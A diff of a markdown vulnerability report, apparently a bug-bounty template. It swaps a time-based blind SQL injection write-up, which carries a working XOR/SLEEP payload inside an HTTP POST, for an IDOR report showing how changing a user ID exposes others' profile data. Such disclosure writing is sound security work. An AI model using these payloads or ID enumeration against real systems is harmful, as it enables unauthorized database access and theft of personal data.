@@ -1,36 +1,37 @@
-# Time-Based Blind SQL Injection in `address` Parameter
+# IDOR on /api/v1/users/{id}/profile allows unauthorized access to user PII
 
 ## Description
-The `address` parameter in the **Address > Update** endpoint is vulnerable to SQL injection. Attackers can trigger time delays to confirm injection and potentially extract data.
+
+The `/api/v1/users/{id}/profile` endpoint fails to verify that the authenticated user matches the requested `{id}` parameter. By changing the user ID to another user's ID, an attacker can read that user's full profile, including name, email, phone number, and home address.
 
 ## Proof of Concept
-```
-POST /ajax_table.php HTTP/1.1
-Host: demo.target.com
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
-address='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z&current=1&device_id=&id=address-search&interface=&rowCount=50&searchPhrase=&search_type=mac&sort[hostname]=asc
 ```
+GET /api/v1/users/1337/profile HTTP/2
+Host: app.example.com
+Authorization: Bearer eyJ...
+Content-Type: application/json
 
-## Expected Behavior
-If vulnerable, the response is delayed (e.g., ~5–7 seconds), confirming execution of the injected SQL.
+---
+
+HTTP/2 200 OK
+
+{
+  "id": 1337,
+  "name": "Integriti",
+  "email": "hunter2@example.com",
+  "phone": "+1-555-5555",
+  "address": "1337 Hackers Ave"
+}
+```
 
 ## Steps to Reproduce
-1. Navigate to **Address > Update**.
-2. Intercept the request in Burp Suite.
-3. Inject:
-   ```
-   'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z
-   ```
-4. Observe delayed response.
+
+1. Log in as user A (attacker) at app.example.com/login.
+2. Navigate to your own profile and intercept the request to `/api/v1/users/{your_id}/profile`.
+3. Change the user ID in the path to another user's ID (e.g., 1337).
+4. Observe the full profile data of user 1337 in the response.
 
 ## Impact
-Attackers can:
-- Extract sensitive DB data
-- Modify or delete records
-- Execute arbitrary SQL
 
-## Recommendation
-- Use parameterized queries (prepared statements).
-- Validate and sanitize all input.
-- Apply least-privilege DB credentials.
+Any authenticated user can read the full personal profile (name, email, phone, home address) of any other user on the platform by iterating over user IDs.
